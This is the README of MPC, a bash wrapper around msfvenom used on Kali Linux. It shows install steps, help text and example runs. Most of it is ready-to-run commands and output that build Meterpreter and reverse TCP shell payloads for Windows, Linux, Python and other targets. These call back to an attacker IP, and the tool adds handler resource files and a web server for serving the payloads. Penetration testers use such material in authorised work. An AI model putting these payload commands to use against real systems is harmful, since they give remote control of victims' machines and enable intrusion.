A **quick** way to generate various "basic" Meterpreter payloads via msfvenom (part of the Metasploit framework).

![Msfvenom Payload Creator (MPC)](https://i.imgur.com/0q41eqR.png)

- - -

## About

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands** and a **quick web server** etc).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

_Note: This will **not** try to bypass any anti-virus solutions._

## Install

* Designed for **Kali Linux 1.1.0a+** & **Metasploit v4.11+** _(nothing else has been tested)_.

```
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
```

## Help

``` bash
root@kali:~# mpc
 [*] Msfvenom Payload Creator (MPC v1.2)

 [i] /usr/bin/mpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<STAGED/STAGELESS>) (<CMD/MSF>) (<LOOP/BATCH>) (<VERBOSE>)
 [i]   Example: /usr/bin/mpc windows 192.168.1.10        # Windows & manual IP.
 [i]            /usr/bin/mpc elf eth0 4444               # Linux, eth0's IP & manual port.
 [i]            /usr/bin/mpc stageless cmd py verbose    # Python, stageless command prompt.
 [i]            /usr/bin/mpc loop eth1                   # A payload for every type, using eth1's IP.
 [i]            /usr/bin/mpc msf batch eth1              # All possible Meterpreter payloads, using eth1's IP.

 [i] <TYPE>: (All reverse TCP payloads)
 [i]   + ASP
 [i]   + ASPX
 [i]   + Bash [.sh]
 [i]   + Java [.jsp]
 [i]   + Linux [.elf]
 [i]   + OSX [.macho]
 [i]   + Perl [.pl]
 [i]   + PHP
 [i]   + Powershell [.ps1]
 [i]   + Python [.py]
 [i]   + Tomcat [.war]
 [i]   + Windows [.exe]

 [i] Rather than putting <DOMAIN/IP>, you can do a interface and MPC will detect that IP address.
 [i] Missing <DOMAIN/IP> will default to the IP menu.

 [i] Missing <PORT> will default to 443.

 [i] <STAGED> splits the payload into parts, making it smaller but dependant on Metasploit.
 [i] <STAGELESS> is the complete standalone payload. More 'stabe' than <STAGELESS>.
 [i] Missing <STAGED/STAGELESS> will default to <STAGED>.
 [i]   Note: Metasploit doesn't (yet!) support <STAGED> for every <TYPE> format.

 [i] <CMD> is a standard/native command prompt/terminal to interactive with.
 [i] <MSF> is a custom cross platform Meterpreter shell, gaining the full power of Metasploit.
 [i]   Note: Metasploit doesn't (yet!) support <MSF>/<CMD> for every <TYPE> format.
 [i] Missing <CMD/MSF> will default to Meterpreter.

 [i] <BATCH> will generate as many combinations as possible: <TYPE>, <STAGED> & <CMD/MSF>.
 [i] <LOOP> will just create one of each <TYPE>.

 [i] <VERBOSE> will display more information during the process.
root@kali:~#
```

## Example \#1 (Windows, Fully Automated With IP)

```bash
root@kali:~# mpc windows 192.168.1.10
 [*] Msfvenom Payload Creator (MPC v1.2)
 [i]    IP: 192.168.1.10
 [i]  PORT: 443
 [i]  TYPE: windows (windows/meterpreter_reverse_tcp)
 [i]   CMD: msfvenom -p windows/meterpreter_reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 -o /root/windows-stageless-meterpreter-443.exe
 [i] windows meterpreter created: '/root/windows-stageless-meterpreter-443.exe'
 [i] MSF handler file: '/root/windows-stageless-meterpreter-443-exe.rc'   (msfconsole -q -r /root/windows-stageless-meterpreter-443-exe.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## Example \#2 (Linux Format, Fully Automated With Interface and Port)

```bash
root@kali:~# ./mpc elf eth0 4444
 [*] Msfvenom Payload Creator (MPC v1.2)
 [i]    IP: 192.168.103.240
 [i]  PORT: 4444
 [i]  TYPE: linux (linux/x86/meterpreter/reverse_tcp)
 [i]   CMD: msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.103.240 LPORT=4444 -o /root/linux-staged-meterpreter-4444.elf
 [i] linux meterpreter created: '/root/linux-staged-meterpreter-4444.elf'
 [i] MSF handler file: '/root/linux-staged-meterpreter-4444-elf.rc'   (msfconsole -q -r /root/linux-staged-meterpreter-4444-elf.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## Example \#3 (Python Format, Stageless Command Prompt Using Interactive IP Menu)

```bash
root@kali:~# bash mpc.sh stageless cmd py verbose
 [*] Msfvenom Payload Creator (MPC v1.2)

 [i] Use which interface/IP address?:
 [i]   1.) eth0 - 192.168.103.240
 [i]   2.) eth1 - 192.168.155.175
 [i]   3.) lo - 127.0.0.1
 [?] Select 1-3, interface or IP address: 2

 [i]    IP: 192.168.155.175
 [i]  PORT: 443
 [i]  TYPE: python (python/shell_reverse_tcp)
 [i] STAGE: stageless
 [i] SHELL: shell
 [i]   CMD: msfvenom -p python/shell_reverse_tcp -f raw --platform python -e generic/none -a python LHOST=192.168.155.175 LPORT=443 -o /root/python-stageless-shell-443.py
 [i] python shell created: '/root/python-stageless-shell-443.py'
 [i] MSF handler file: '/root/python-stageless-shell-443-py.rc'   (msfconsole -q -r /root/python-stageless-shell-443-py.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

![Examples](https://i.imgur.com/m4lG23l.png)

- - -

## To-Do List

* Display file stats (e.g. file, size, md5/sha1) _Commands are in, just commented out._
* Support different payloads (e.g. `reverse_http`/`reverse_https`, `bind`, `find_port` etc)
* x64 payloads
* external IP/WAN
* _...IPv6 support?_
